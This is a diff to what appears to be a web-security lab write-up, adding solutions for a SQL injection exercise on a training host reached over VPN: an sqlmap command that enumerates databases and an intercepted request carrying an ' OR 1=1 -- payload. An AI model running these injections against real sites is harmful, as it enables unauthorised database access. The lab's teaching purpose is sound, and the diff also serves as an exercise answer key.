@@ -10,7 +10,14 @@ Access the machine cyber_websec_0x01 through the VPN.
 Navigate to: http://web0x01.hbtn/a3/sql_injection/. (dont forget to edit your /etc/hosts)
 Search for the vulnerable paramters.
 
-R: 
+R:
+
+sqlmap:
 sqlmap -u "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=paid" --tamper=space2comment --level=5 --risk=3 --dbs
+
+BurpSuite:
+
+in interception
+GET /api/a3/sql_injection/all_orders?status=%27%20OR%201%3D1%20-- HTTP/1.1
 
 ======
